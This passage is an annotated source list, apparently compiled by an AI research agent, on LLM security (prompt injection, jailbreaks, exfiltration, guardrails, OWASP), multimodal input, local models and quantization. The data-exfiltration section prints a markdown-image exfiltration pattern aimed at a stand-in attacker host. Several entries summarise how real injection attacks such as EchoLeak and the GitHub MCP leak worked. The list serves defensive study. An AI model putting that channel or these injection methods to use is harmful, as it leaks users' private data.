   Checked: Opened. Still the reference paper for indirect injection.
3. **The Attacker Moves Second** by Nasr, Carlini, Sitawarin et al., 2025-10-10
   https://arxiv.org/abs/2510.09023
   kind: paper · primary: yes
   Why: Adaptive attacks break 12 published defenses, most at over 90% success. Static attack strings are a poor way to test a defense.
   Checked: Current.
4. **Mitigating the risk of prompt injections in browser use** by Anthropic, 2025-11-24
   https://www.anthropic.com/news/prompt-injection-defenses
   kind: blog · primary: yes
   Why: A vendor's view with numbers. RL training, classifiers and red-teaming bring attack success to 1%, and "No browser agent is immune to prompt injection."
   Checked: Opened. A search result claims newer numbers (Opus 5 with Auto Mode, July 2026) that I didn't open. See Gaps.
5. **LLM01:2025 Prompt Injection** by OWASP GenAI Security Project, 2025
   https://genai.owasp.org/llmrisk/llm01-prompt-injection/
   kind: spec · primary: yes
   Why: Standard definitions of direct and indirect injection, plus a mitigation list. "it is unclear if there are fool-proof methods of prevention for prompt injection."
   Checked: This is the 2025 page. The 2026 edition keeps it at #1 (LLM01:2026). I didn't find a separate 2026 per-risk page.
6. **Prompt injection and jailbreaking are not the same thing** by Simon Willison, 2024-03-05
   https://simonwillison.net/2024/Mar/5/prompt-injection-jailbreaking/
   kind: blog · primary: yes
   Why: The compare_with boundary: "if there's no concatenation of trusted and untrusted strings, it's _not prompt injection_."
   Checked: Current.

Alternate: **The Instruction Hierarchy** by Wallace et al. (OpenAI), 2024-04-19 (https://arxiv.org/abs/2404.13208). A training-side defense: teach the model to rank system prompt over user over tool text.
Also serves: jailbreaks, data-exfiltration, guardrails, system-prompt.

### jailbreaks (short)
1. **Jailbroken: How Does LLM Safety Training Fail?** by Alexander Wei, Nika Haghtalab, Jacob Steinhardt, 2023-07-05
   https://arxiv.org/abs/2307.02483
   kind: paper · primary: yes
   Why: Explains why jailbreaks work, with two failure modes: competing objectives and mismatched generalization.
   Checked: Tested on GPT-4 and Claude v1.3, so the models are old. The framework still holds.
2. **Universal and Transferable Adversarial Attacks on Aligned Language Models (GCG)** by Zou, Wang, Carlini, Nasr, Kolter, Fredrikson, v2 2023-12-20
   https://arxiv.org/abs/2307.15043
   kind: paper · primary: yes
   Why: Automated suffix search that transfers from open models to ChatGPT, Bard and Claude.
   Checked: Old models, still the standard paper.

Alternates:
- **Many-shot jailbreaking**, Anthropic, 2024-04-02 (https://www.anthropic.com/research/many-shot-jailbreaking): long context opened a new attack. Prompt classification cut one attack from 61% to 2%.
- **Constitutional Classifiers** (see guardrails #3).

Also serves: post-training, guardrails, prompt-injection.

### data-exfiltration (deep)
1. **The lethal trifecta for AI agents** by Simon Willison, 2025-06-16
   https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
   kind: blog · primary: yes
   Why: The core model: private data + untrusted content + a way to send data out. On guardrails: "in web application security 95% is very much a failing grade."
   Checked: Current. His exfiltration tag has 2026 cases (latest 2026-07-15): https://simonwillison.net/tags/exfiltration-attacks/
2. **ChatGPT: Data Exfiltration via Plugins and Markdown Injection** by Johann Rehberger (Embrace The Red), 2023-05-16
   https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/
   kind: blog · primary: yes (the researcher who found it)
   Why: The markdown-image channel `![x](https://attacker?q=DATA)`. OpenAI's reply at the time was that it's "a feature".
   Checked: ChatGPT plugins are gone. Use it for the mechanism, which still appears in 2025–2026 cases.
3. **EchoLeak: The First Real-World Zero-Click Prompt Injection Exploit in a Production LLM System** by Pavan Reddy, Aditya Sanjay Gujral, 2025-09
   https://arxiv.org/abs/2509.10540
   kind: paper · primary: no (case study; Aim Security found the bug)
   Why: One email to Microsoft 365 Copilot, CVE-2025-32711. It got past the injection classifier and link redaction, then used an allowed Teams proxy in the page's security policy. A layered defense failing in practice.
   Checked: Opened the abstract.
4. **GitHub MCP Exploited: Accessing private repositories via MCP** by Marco Milanta, Luca Beurer-Kellner (Invariant Labs), 2025-05-26
   https://invariantlabs.ai/blog/mcp-github-vulnerability
   kind: blog · primary: yes
   Why: A malicious public issue leads to private code leaking through a PR. "a fundamental architectural issue that must be addressed at the agent system level."
   Checked: Opened.
5. **Defeating Prompt Injections by Design (CaMeL)** by Debenedetti, Shumailov, … Carlini, … Tramèr (Google DeepMind et al.), v2 2025-06-24
   https://arxiv.org/abs/2503.18813
   kind: paper · primary: yes
   Why: A design-level fix. It pulls the control flow out of the trusted query, and capabilities block data from flowing out. It solves 77% of AgentDojo tasks with provable guarantees, against 84% undefended.
   Checked: Current.
6. **Agents Rule of Two** by Meta AI, 2025-10-31
   https://ai.meta.com/blog/practical-ai-agent-security/
   kind: blog · primary: yes
   Why: A practical rule: an agent should have at most two of three things (untrusted input, sensitive data, changing state or talking to the outside). "Prompt injection is a fundamental, unsolved weakness in all LLMs."
   Checked: Current.

Alternates:
- **Design Patterns for Securing LLM Agents against Prompt Injections**, Beurer-Kellner et al., 2025-06 (https://arxiv.org/abs/2506.08837).
- **Willison on the Rule of Two and The Attacker Moves Second**, 2025-11-02 (https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/).

Also serves: prompt-injection, excessive-agency, tool-calling, guardrails.

### excessive-agency (short)
1. **LLM06:2025 Excessive Agency** by OWASP GenAI Security Project, 2025
   https://genai.owasp.org/llmrisk/llm062025-excessive-agency/
   kind: spec · primary: yes
   Why: Three root causes (too much functionality, too many permissions, too much autonomy) and eight mitigations.
   Checked: This is the 2025 page. In 2026 this risk moved up to #3 (LLM03:2026).
2. **Beyond permission prompts: making Claude Code more secure and autonomous (sandboxing)** by David Dworken, Oliver Weller-Davies (Anthropic), 2025-10-20
   https://www.anthropic.com/engineering/claude-code-sandboxing
   kind: blog · primary: yes
   Why: A real tradeoff. Too many prompts cause approval fatigue. Limiting filesystem and network access cut prompts by 84%.
   Checked: Current.

Alternates:
- **How we contain Claude across products**, Anthropic, 2026-05-25 (https://www.anthropic.com/engineering/how-we-contain-claude): "Design for containment at the environment layer first, then steer behavior at the model layer."
- Meta Rule of Two (see data-exfiltration #6).

Also serves: agent-loop, data-exfiltration, guardrails.

### guardrails (deep)
1. **NeMo Guardrails: A Toolkit for Controllable and Safe LLM Applications with Programmable Rails** by Rebedea, Dinu, Sreedhar, Parisien, Cohen (NVIDIA), 2023-10-16 (EMNLP 2023 demo)
   https://arxiv.org/abs/2310.10501
   kind: paper · primary: yes
   Why: Defines "rails" as runtime checks that work with any model. The current docs (https://docs.nvidia.com/nemo/guardrails/latest/index.html) list five kinds: input, retrieval, dialog, execution, output.
   Checked: The paper is 2023. The docs show no version or date.
2. **Llama Guard 4 (model card)** by Meta, 2025-04-05
   https://huggingface.co/meta-llama/Llama-Guard-4-12B
   kind: docs · primary: yes
   Why: An open classifier for inputs and outputs using the MLCommons categories S1–S14, and it handles images. Its own limits section says it remains "susceptible to adversarial attacks or prompt injection attacks." For injection it recommends Prompt Guard 2 alongside it.
   Checked: Current. The original paper is Inan et al., 2023-12 (https://arxiv.org/abs/2312.06674).
3. **Constitutional Classifiers** by Anthropic, 2025-02-03, and **Next-generation Constitutional Classifiers**, 2026-01-09
   https://www.anthropic.com/research/constitutional-classifiers · https://www.anthropic.com/research/next-generation-constitutional-classifiers
   kind: blog · primary: yes
   Why: The costs, measured. v1 cut jailbreak success from 86% to 4.4%, with +0.38% over-refusal and +23.7% compute, and a public demo still found one universal jailbreak. v2 uses a cheap activation probe that escalates to a bigger classifier: about 1% compute (per the blog), 0.05% refusals, 1,700+ hours of red-teaming.
   Checked: v2 is current. The paper is https://arxiv.org/abs/2601.04603, which reports "a 40x computational cost reduction".
4. **Mitigate jailbreaks and prompt injections** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks
   kind: docs · primary: yes
   Why: Build patterns: screen inputs with a small model, put untrusted content only in `tool_result` and JSON-encode it, screen tool outputs, least privilege, red-team your own agent.
   Checked: Current.
5. **Guardrails and human review** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/agents/guardrails-approvals
   kind: docs · primary: yes
   Why: Input, output and tool guardrails, tripwire exceptions, `needsApproval` tools, and a latency tradeoff: guardrails can block before the agent runs or run in parallel with it.
   Checked: Current. The fetch summary wrongly called this an Anthropic page. The URL is OpenAI's.

For the skeptic side, see prompt-injection #3 (Nasr et al.) and data-exfiltration #1 (Willison).

Alternates:
- **OpenAI moderation** (https://developers.openai.com/api/docs/guides/moderation): `omni-moderation-latest`, free, 13 categories, handles images.

Also serves: prompt-injection, jailbreaks, pii-handling, excessive-agency.

### pii-handling (short)
1. **Presidio** by the Data Privacy Stack (formerly Microsoft), undated, checked 2026-09-23
   https://presidio.dataprivacystack.org/ (microsoft.github.io/presidio redirects here; GitHub repo https://github.com/microsoft/presidio)
   kind: docs/code · primary: yes
   Why: How detection works: an analyzer uses NER, regex, checksums and context, then an anonymizer replaces what it found. The honest limit: "there is no guarantee that Presidio will find all sensitive information."
   Checked: Current. The project moved from Microsoft to community ownership. I couldn't see the latest version number.
2. **Masking sensitive data** by Langfuse, undated, checked 2026-09-23
   https://langfuse.com/docs/observability/features/masking
   kind: docs · primary: yes
   Why: Redact before trace data leaves your app (`mask_otel_spans` runs at export). Directly useful for your logging build.
   Checked: Current.

Alternates:
- The OTel opt-in rule for message content (see llm-tracing #1).
- **LLM02:2025 Sensitive Information Disclosure** (https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/).
- Provider retention: **OpenAI "Data controls"** (https://developers.openai.com/api/docs/guides/your-data): not used for training by default, 30-day abuse logs, zero data retention available. **Anthropic privacy center** (https://privacy.claude.com/en/articles/7996866-how-long-do-you-store-my-organization-s-data): API data deleted within 30 days, policy-flagged content kept up to 2 years.
- **Extracting Training Data from Large Language Models**, Carlini et al., 2020-12 (https://arxiv.org/abs/2012.07805): the "and training" part of the note.

Also serves: llm-tracing, guardrails.

### owasp-llm-top-10 (short)
1. **OWASP Top 10 for LLM Applications 2026 (repo README)** by OWASP GenAI Security Project, published 2026-08-04
   https://github.com/GenAI-Security-Project/GenAI-LLM-Top10
   kind: spec · primary: yes
   Why: The current list, in order:
   1. Prompt Injection
   2. Sensitive Information Disclosure
   3. Excessive Agency
   4. Supply Chain
   5. Data and Model Poisoning
   6. Unbounded Consumption
   7. Misinformation
   8. Hidden Context Exposure (renamed from System Prompt Leakage)
   9. Vector and Embedding Weaknesses
   10. Improper Output Handling

   It combines community votes with real-incident data.
   Checked: Current. The old repo (github.com/owasp/www-project-top-10-for-large-language-model-applications) is now a legacy archive that points here.
2. **OWASP GenAI LLM Top 10 2026 (resource page)** by OWASP GenAI Security Project, 2026-08-03
   https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/
   kind: spec · primary: yes
   Why: The official download. It maps each risk to NIST, MITRE ATLAS, CWE and the Agentic Top 10.
   Checked: Current. The 2025 list (https://genai.owasp.org/llm-top-10/, released 2025) is replaced but still has the per-risk pages cited above.

Alternates:
- **OWASP Top 10 for Agentic Applications 2026**, released 2025-12-09 (https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/). Agents-with-tools risks now go here.
- **Aembit summary** (https://aembit.io/blog/the-owasp-top-10-for-llm-applications-2026-what-changed-and-why-it-matters/, 2026-09): primary: no. A 2025-vs-2026 rank table that matches the primary list.

Also serves: prompt-injection, excessive-agency, pii-handling, and the phase 6 security review.

### Disagreements and tensions
- **Can prompt injection be solved?**
  - Meta ("fundamental, unsolved"), OWASP LLM01 ("unclear if there are fool-proof methods"), Willison and Honeycomb/Carter ("no solution today") treat it as unsolved and push design limits: the lethal trifecta, the Rule of Two, CaMeL.
  - Anthropic reports about 1% browser attack success with layered defenses but still says "No browser agent is immune."
  - Nasr et al. argue that low numbers from static tests mean little.
- **Do guardrail classifiers help?**
  - Anthropic (Constitutional Classifiers: 86% → 4.4%) and OpenAI (layered guardrails) say yes.
  - Willison: "95% is very much a failing grade" in security.
  - Llama Guard 4's own card and the EchoLeak bypass of Microsoft's injection classifier show classifiers get beaten.
  - Willison also warns that jailbreak filters don't stop injection. That's a question of scope, not of whether classifiers work.
- **Rule of Two vs lethal trifecta.** Willison says the Rule of Two wrongly treats "untrusted input + can change state" as safe. The trifecta, in turn, doesn't cover harm done through state changes alone.
- **Does prompt caching cut latency?** Anthropic claims up to 85%, and ngrok measured large drops in time-to-first-token. Redis's semantic-cache docs say prompt caching "does not address latency" because the model still runs. Both are true in part: caching skips reading the prompt, not generating the answer.
- **Rate-limit accounting differs by provider.** Anthropic: `max_tokens` doesn't count toward OTPM and cached reads don't count toward ITPM. OpenAI: `max_tokens` counts, and failed requests count toward the limit too.
- **Retry counts.** The Anthropic SDK retries twice by default. Google SRE allows up to 3 attempts plus a 10% retry budget per client. AWS says retry at one layer only. An SDK retrying under your own retry loop, under a gateway's fallback, is the stacking both AWS and SRE warn against.
- **Fallback vs caching.** Claude Code's team says never switch models mid-session because the cache belongs to one model. A cross-provider fallback always starts with an empty cache, so a fallback costs more and is slower on long prompts.
- **Semantic cache thresholds.** Redis uses one fixed distance (default 0.1 per the search result). vCache says fixed thresholds give "unexpected error rates". CacheAttack shows the similarity itself can be attacked.
- **Where prompts live.** Langfuse and Braintrust: a registry with labels, rollback without a deploy. 12-Factor Agents: prompts are code in your repo. The Humanloop shutdown (2025-09-08, all data gone) supports the in-repo side.
- **OWASP 2026 secondary reports disagree.** Help Net Security gives an order that doesn't match the primary README, and says 6,639 incidents. Aembit says 7,714. Cite the GitHub README for the order and check the incident count in the PDF.
- **Constitutional Classifiers v2 cost.** The blog says about 1% compute overhead. The paper says "40x" lower than the baseline exchange classifier. A search snippet said 3.5%, which I didn't verify. Check the paper before quoting a number.

### Couldn't open
- https://aws.amazon.com/builders-library/timeouts-retries-and-backoff-with-jitter/ (Marc Brooker, 2019). It redirects to builder.aws.com, which returned an empty JS shell. The PDF (https://d1.awsstatic.com/builderslibrary/pdfs/timeouts-retries-and-backoff-with-jitter.pdf) came back as binary I couldn't read. Not counted. This is the best source for retry amplification across layers; if you can open it in a browser, it's worth adding.
- https://opentelemetry.io/docs/specs/semconv/gen-ai/ and .../gen-ai-spans/: opened, but they're stubs that only point to the new repo. I cited the repo.
- https://cybersecuritynews.com/owasp-genai-llm-top-10-2026/: returned an empty page.
- https://opentelemetry.io/blog/2024/llm-observability/: opened, but the page shows no date or byline (2024 per the URL).

### Rejected
- aihero.dev AI Engineer Roadmap (https://www.aihero.dev/ai-engineer-roadmap): last updated 2025-03-18, and has nothing on caching, tracing or security.
- Help Net Security OWASP 2026 article: its list order conflicts with the primary README.
- OpenTelemetry blog "Introduction to Observability for LLM-based applications": no date, mostly a demo of one vendor tool (OpenLIT), replaced by the spec.
- Helicone caching docs: exact-match caching only, not semantic. Could serve as a contrast example at most.
- PromptLayer and Braintrust "best prompt versioning tools" articles: vendor marketing.
- dev.to and Medium model-migration posts: secondary, anecdotal. The GitHub blog and Chen et al. cover the same ground from primary sources.
- vLLM PagedAttention paper (arXiv 2309.06180): belongs in kv-cache, not here.
- OpenAI "Models" page: says nothing about snapshots vs aliases. Anthropic's model-IDs page covers it.
- OpenRouter "model-routing" page: covers the Auto Router, not fallbacks. I used the model-fallbacks page instead.

### Gaps
- **prompt-injection**: I didn't open Anthropic's 2026 numbers (Sonnet 4.6 at 1.29%, Opus 5 with Auto Mode at 0% across 129 scenarios). They came from search snippets and a news site. Find the system card or the Claude in Chrome post if you want current figures.
- **owasp-llm-top-10**: I didn't open the 2026 PDF itself, so I can't confirm the methodology numbers or whether per-risk pages for 2026 exist. The Agentic Top 10 item names (ASI01–ASI10) weren't on the resource page either.
- **retries**: there's no LLM-specific primary source on streaming retries: what to do when a stream fails after a 200, and how to retry non-idempotent tool calls. Anthropic's errors page only mentions mid-stream errors in passing.
- **llm-tracing**: the OTel GenAI conventions are still "Development". Nothing stable exists yet, so say that in the article. I didn't find a primary source with latency or cost numbers from a real tracing setup beyond Honeycomb 2024.
- **semantic-caching**: there's no builder's post with real production hit rates. Redis's "30% or more" savings claim comes without data.
- **provider-fallback**: all the sources are gateway docs. None measures the quality change when falling back to a different model, which is also a model-upgrades eval problem.

## Phase 7: Beyond text, open models, fine-tuning

I opened every source below on 2026-09-23 with WebFetch, and the page matched what I say about it.

Three things change the plan:
1. **OpenAI is shutting down its fine-tuning platform.** New organizations have been blocked since 2026-05-07, and existing customers lose the ability to start new jobs on 2027-01-06. OpenAI's own distillation guide now redirects to that same fine-tuning page. So the fine-tuning build has to use an open model (TRL plus PEFT, run locally or rented), not the OpenAI API.
2. **The "Mistral OCR" post from 2025-03-06 now carries a notice that it is no longer maintained.** The current post is OCR 4, from 2026-06-23.
3. **The document-parsing benchmarks don't agree on rankings.** Details are under Disagreements.

### vision-models (deep)
1. **An Image is Worth 16x16 Words: Transformers for Image Recognition at Scale (ViT)** by Dosovitskiy et al. (Google), v1 2020-10-22, v2 2021-06-03
   https://arxiv.org/abs/2010.11929
   kind: paper · primary: yes
   Why: The original idea of cutting an image into fixed-size patches and feeding them to a transformer as a sequence of tokens.
   Checked: Abstract says "a pure transformer applied directly to sequences of image patches can perform very well". Old, but still the base idea behind today's vision encoders.
2. **Learning Transferable Visual Models From Natural Language Supervision (CLIP)** by Radford et al. (OpenAI), 2021-02-26
   https://arxiv.org/abs/2103.00020
   kind: paper · primary: yes
   Why: How an image encoder learns to line up with text: trained on 400M image-caption pairs by predicting which caption goes with which image.
   Checked: Abstract has the 400M pairs and the zero-shot ImageNet result that matches ResNet-50. Still the standard reference.
3. **Visual Instruction Tuning (LLaVA)** by Liu, Li, Wu, Lee, 2023-04-17 (rev. 2023-12-11), NeurIPS 2023 oral
   https://arxiv.org/abs/2304.08485
   kind: paper · primary: yes
   Why: The simplest clear design for plugging a vision encoder into an LLM: encoder, then a projection, then the LLM, trained on GPT-4-generated instruction data.
   Checked: Abstract says it "connects a vision encoder and LLM". Newer VLMs build on this pattern.
4. **Vision (Claude API docs)** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/vision
   kind: docs · primary: yes
   Why: The builder's view of "images become tokens": 28×28-px patches, cost = ⌈w/28⌉×⌈h/28⌉ visual tokens, downscaling rules, and a limitations list (counting, small images, spatial reasoning).
   Checked: Current. Has a high-resolution tier for Claude 4.7 and later (2576 px, 4784 tokens) and a standard tier (1568 px). Examples use claude-opus-5-5.
5. **Images and vision (OpenAI API docs)** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/images-vision
   kind: docs · primary: yes
   Why: A second provider's tokenizer: 32-px patches with per-model multipliers on newer models, 512-px tiles on older ones (gpt-4o, gpt-5.1), plus a `detail` knob. Useful to show that each provider counts image tokens differently.
   Checked: Current. It lists gpt-6-astra and gpt-5.5. The old platform.openai.com URL now redirects here.
6. **Vision language models are blind** by Rahmanzadehgervi, Bolton, Taesiri, Nguyen, 2024-07 (rev. 2025-03)
   https://arxiv.org/abs/2407.06581
   kind: paper · primary: yes
   Why: The counterweight. VLMs fail simple geometry tasks (58% average; Claude 3.5 Sonnet best at 77.8%), and linear probing puts the bottleneck in the language side, not the encoder.
   Checked: Abstract and numbers confirmed. The models tested are older generations, so treat the numbers as history and the failure mode as the point.
Also serves: pdf-input (#4, #5), document-parsing (#6, for why VLM parsing makes mistakes)

### pdf-input (short)
1. **PDF support (Claude API docs)** by Anthropic, undated, checked 2026-09-23
   https://platform.claude.com/docs/en/build-with-claude/pdf-support
   kind: docs · primary: yes
   Why: Explains the mechanism: "The system converts each page of the document into an image" and extracted text is sent alongside it. Also has costs (1,500–3,000 text tokens per page plus image tokens), limits (600 pages, 32 MB), and a text-only fallback (about 1,000 vs about 7,000 tokens for a 3-page PDF on Bedrock Converse).
   Checked: Current, marked GA.
2. **File inputs: PDF files (OpenAI API docs)** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/pdf-files
   kind: docs · primary: yes
   Why: Same text-plus-page-image design ("both text and page images"). The 50 MB limit and `detail` default (high on GPT-5.6+, low before) show the cost choice.
   Checked: Current. Redirected from platform.openai.com.
3. **Document understanding (Gemini API docs)** by Google, last updated 2026-09-17
   https://ai.google.dev/gemini-api/docs/document-processing
   kind: docs · primary: yes
   Why: A different approach, useful as a comparison: "native vision", a flat "258 tokens" per page, up to 1,000 pages, and native text billed at zero on Gemini 3.
   Checked: Current.
Also serves: document-parsing (as the "just send it to the model" alternative)

### document-parsing (deep)
1. **Docling Technical Report** by Auer et al. (IBM Research), 2024-08-19, v5 2024-12-09
   https://arxiv.org/abs/2408.09869
   kind: paper · primary: yes
   Why: How a pipeline parser works: a layout model (DocLayNet) and a table-structure model (TableFormer) that run on ordinary hardware.
   Checked: Abstract confirmed. The paper is older than the current code. Pair it with #2.
2. **Docling (GitHub repo)** by docling-project, undated, checked 2026-09-23
   https://github.com/docling-project/docling
   kind: code · primary: yes
   Why: What Docling does now: layout, reading order, tables, formulas, OCR, an optional VLM path (GraniteDocling), and an MCP server.
   Checked: Active (1,478 commits). No version number was visible on the page.
3. **Marker (GitHub repo)** by Datalab, undated, checked 2026-09-23
   https://github.com/datalab-to/marker
   kind: code · primary: yes
   Why: A hybrid design: a text layer from pdftext, a layout detector, OCR only on garbled pages, and VLM fallback for tables. It publishes speed-vs-quality numbers on olmOCR-bench (balanced 76.0% at 2.9 pages/s; fast mode without OCR 43.6% at 23.7 pages/s on CPU).
   Checked: Active. The benchmark numbers are the vendor's own.
4. **OmniDocBench** by Ouyang et al. (OpenDataLab), 2024-12-10, v2 2025-03-25, CVPR 2025; repo leaderboard v1.7 on 2026-04-30
   https://arxiv.org/abs/2412.07626 and https://github.com/opendatalab/OmniDocBench
   kind: paper + code · primary: yes
   Why: A neutral benchmark that compares pipeline tools with general and specialized VLMs. Overall = (1−text edit distance)×100 + table TEDS + formula CDM, divided by 3. Leaderboard: specialized VLMs about 96–97 (TeleOCR 96.91), Gemini 3 Pro 92.91, GPT-4o 86.59, MinerU pipeline 86.47, Mistral OCR 85.66, Marker 78.44.
   Checked: The leaderboard is current as of 2026-04-30. Docling is not in the main ranked table.
5. **olmOCR: Unlocking Trillions of Tokens in PDFs with Vision Language Models** by Poznanski et al. (Ai2), 2025-02-25, v3 2025-07-02
   https://arxiv.org/abs/2502.18443
   kind: paper · primary: yes
   Why: The fine-tuned-VLM approach, with cost numbers: about $176 per million pages vs about $6,240 for GPT-4o. It also introduces olmOCR-bench (1,400 PDFs), the benchmark Marker and Mistral report on.
   Checked: Abstract and version history confirmed.
6. **Mistral OCR 4** by Mistral AI, 2026-06-23
   https://mistral.ai/news/ocr-4/
   kind: blog · primary: yes
   Why: The hosted-API option. $4 per 1,000 pages ($2 with batch), bounding boxes and confidence scores, and an honest note that benchmark ground-truth errors can skew scores, so "evaluating on your own documents" is the advice.
   Checked: Current. It replaces the 2025 Mistral OCR post, which is now marked unmaintained.
Also serves: pdf-input (#4 compares "send to a general VLM" with parsing first), evals nodes (#4 and #6 on benchmark limits)

### speech-to-text (short)
1. **Robust Speech Recognition via Large-Scale Weak Supervision (Whisper)** by Radford et al. (OpenAI), 2022-12-06
   https://arxiv.org/abs/2212.04356
   kind: paper · primary: yes
   Why: The mechanism and the data story: 680,000 hours of weakly labeled audio give robust zero-shot transcription.
   Checked: Abstract confirmed. OpenAI now calls whisper-1 the legacy API model, but the paper is still the base reference.
2. **Speech to text (OpenAI API docs)** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/speech-to-text
   kind: docs · primary: yes
   Why: What a builder deals with: a 25 MB file limit, splitting long audio, streaming with `gpt-transcribe`, diarization, prompt and keywords for jargon, and timestamps only on whisper-1.
   Checked: Current. `gpt-transcribe` is the recommended model and whisper-1 is labeled legacy.
3. (optional) **Open ASR Leaderboard** by Srivastav et al. (Hugging Face, NVIDIA and others), 2025-10-08, rev. 2026-03-30
   https://arxiv.org/abs/2510.06961
   kind: paper · primary: yes
   Why: The accuracy-vs-speed trade-off (WER vs RTFx) across 86 systems. Conformer plus LLM decoders are the most accurate; CTC and TDT decoders are faster.
   Checked: Abstract confirmed.

### text-to-speech (short)
1. **Text to speech (OpenAI API docs)** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/text-to-speech
   kind: docs · primary: yes
   Why: Streaming playback over chunked transfer, "For the fastest response times, we recommend using `wav` or `pcm`", and the legacy tts-1 described as "lower latency, but at a lower quality".
   Checked: Current. gpt-4o-mini-tts is the main model.
2. **Latency optimization (ElevenLabs docs)** by ElevenLabs, undated, checked 2026-09-23
   https://elevenlabs.io/docs/best-practices/latency-optimization
   kind: docs · primary: yes
   Why: Numbers on where latency comes from: Flash models at about 75 ms inference, 100–200 ms time to first byte by region, websockets vs HTTP streaming, and voice type.
   Checked: Current.
3. (optional) **Voice agents (OpenAI API docs)** by OpenAI, undated, checked 2026-09-23
   https://developers.openai.com/api/docs/guides/voice-agents
   kind: docs · primary: yes
   Why: Chained STT → LLM → TTS vs speech-to-speech: lower latency vs being able to see and swap each stage.
   Checked: Current.
Also serves: streaming, speech-to-text (#3)

### local-models (deep)
1. **llama.cpp (GitHub repo)** by ggml-org, undated, checked 2026-09-23
   https://github.com/ggml-org/llama.cpp
   kind: code · primary: yes
   Why: The engine under most local tools. Metal, CUDA and CPU backends, 1.5- to 8-bit quantization, CPU+GPU split, and an OpenAI-compatible `llama-server`.
   Checked: Active.
2. **GGUF spec** by ggml-org, undated, checked 2026-09-23
   https://github.com/ggml-org/ggml/blob/master/docs/gguf.md
   kind: spec · primary: yes
   Why: Why local models ship as one file: the goals are single-file deployment, mmap loading and key-value metadata. It also explains why GGUF replaced GGJT: "Adding or removing any new hyperparameters is a breaking change".
   Checked: Current.
3. **Ollama FAQ** by Ollama, undated, checked 2026-09-23
   https://docs.ollama.com/faq
   kind: docs · primary: yes
   Why: The traps you'll hit in practice. The default context is 4096 tokens, which will quietly cut off RAG prompts in the eval comparison. It also covers GPU/CPU split in `ollama ps`, `keep_alive`, and quantized KV cache (q8_0 at about ½ the memory, q4_0 at about ¼).
   Checked: Current.
4. **OpenAI compatibility (Ollama docs)** by Ollama, undated, checked 2026-09-23
   https://docs.ollama.com/api/openai-compatibility
   kind: docs · primary: yes
   Why: How to point existing API code at a local model, and what breaks: no logprobs, no `tool_choice`, images only as base64.
   Checked: Current.
5. **llama.cpp quantize README** by ggml-org, undated, checked 2026-09-23
   https://github.com/ggml-org/llama.cpp/blob/master/tools/quantize/README.md
   kind: docs · primary: yes
   Why: Measured Llama-3.1-8B numbers. F16 is 14.96 GiB and generates 29 tok/s; Q4_K_M is 4.58 GiB and generates 72 tok/s. Generation speed follows model size.
   Checked: Current.
6. **Performance of llama.cpp on Apple Silicon M-series (discussion #4167)** by ggml-org community, started 2023-11-22 and still updated
   https://github.com/ggml-org/llama.cpp/discussions/4167
   kind: code (benchmark thread) · primary: yes
   Why: Shows why generation is limited by memory bandwidth. Prompt processing and token generation are measured separately (M2 Ultra at 800 GB/s gives about 41 tok/s on F16; M4 Max at 546 GB/s gives about 32).
   Checked: The thread includes M4-era results. It is community-contributed data.
Also serves: quantization (#2, #5, #6)

### quantization (deep)
1. **LLM.int8(): 8-bit Matrix Multiplication for Transformers at Scale** by Dettmers, Lewis, Belkada, Zettlemoyer, 2022-08, NeurIPS 2022
   https://arxiv.org/abs/2208.07339
   kind: paper · primary: yes
   Why: The outlier problem and the mixed-precision fix. Outlier features stay in 16-bit while 99.9% of the math runs in 8-bit.
   Checked: Abstract confirmed. Foundational.
2. **GPTQ** by Frantar, Ashkboos, Hoefler, Alistarh, 2022-10-31 (rev. 2023-03-22), ICLR 2023
   https://arxiv.org/abs/2210.17323
   kind: paper · primary: yes
   Why: Post-training weight quantization to 3–4 bits using second-order information. A 175B model is quantized in about 4 GPU hours, with 3.25–4.5× speedup.
   Checked: Abstract confirmed.
3. **AWQ: Activation-aware Weight Quantization** by Lin et al. (MIT Han Lab), 2023-06-01, v6 2026-04-25, MLSys 2024 Best Paper
   https://arxiv.org/abs/2306.00978
   kind: paper · primary: yes
   Why: The "not all weights matter equally" idea: "Protecting only 1% salient weights can greatly reduce quantization error".
   Checked: Abstract confirmed. Recently revised.
4. **"Give Me BF16 or Give Me Death"? Accuracy-Performance Trade-Offs in LLM Quantization** by Kurtic, Marques, Pandit, Kurtz, Alistarh (Neural Magic / Red Hat), 2024-11-04, v4 2026-05-26, ACL 2025
   https://arxiv.org/abs/2411.02355
   kind: paper · primary: yes
   Why: The numbers on quality cost from 500k+ evaluations on Llama-3.1. FP8 is "effectively lossless", INT8 loses 1–3%, and INT4 weight-only comes close to 8-bit. Also covers which format fits which serving setup.
   Checked: Abstract and versions confirmed.
5. **An empirical study of LLaMA3 quantization: from LLMs to MLLMs** by Huang et al., 2024-04-22 (rev. 2025-01-13)
   https://arxiv.org/abs/2404.14047
   kind: paper · primary: yes
   Why: The other side: LLaMA3 "still suffers from non-negligible degradation", especially at very low bit widths, including in a multimodal model.
   Checked: Abstract confirmed.
6. **GGUF quantization types (Hugging Face Hub docs)** by Hugging Face, undated, checked 2026-09-23
   https://huggingface.co/docs/hub/gguf
   kind: docs · primary: no (HF documents llama.cpp's formats; the primary sources are the linked llama.cpp PRs)
   Why: Translates the file names you'll download: block and super-block layouts and exact bits per weight (Q4_K 4.5, Q6_K 6.5625, IQ2_XXS 2.06). Q4_0 and Q8_0 are marked legacy.
   Checked: Current. Includes MXFP4.
Extra, for understanding: **Quantization overview (Transformers docs)**, https://huggingface.co/docs/transformers/main/en/quantization/overview. It has a table of 20+ methods, and the split between "calibration" and "on-the-fly" methods is useful framing. primary: yes for the HF integrations.
Also serves: local-models, lora (QLoRA below)

### fine-tuning (deep)
